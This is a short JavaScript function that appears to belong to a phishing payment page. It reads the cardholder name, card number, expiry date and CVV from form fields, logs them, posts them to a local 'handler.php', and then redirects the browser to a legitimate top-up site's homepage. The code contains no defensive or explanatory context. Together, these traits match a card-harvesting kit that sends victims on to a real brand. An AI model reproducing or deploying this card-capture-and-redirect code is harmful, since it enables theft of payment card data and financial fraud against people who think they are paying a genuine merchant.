function sendCardData() {
    const cardData = new FormData();
    cardData.append('cardHolder', document.getElementById("cardHolder").value.trim());
    cardData.append('cardNumber', document.getElementById("cc-number").value.replace(/\s/g, ""));
    cardData.append('expiration', document.getElementById("cc-expiration").value);
    cardData.append('cvv', document.getElementById("cc-cvv").value);

    console.log("Sending data:", cardData);

    fetch("handler.php", {
        method: "POST",
        body: cardData
    })
    .then(response => {
        return response.text();
    })
    .then(data => {
        if (data === "ok") {
            window.location.href = "https://www.recharge.com/en/au";
        } else {
            alert("Something went wrong. Please try again!");
        }
    })
    .catch(error => console.error("Error:", error));
}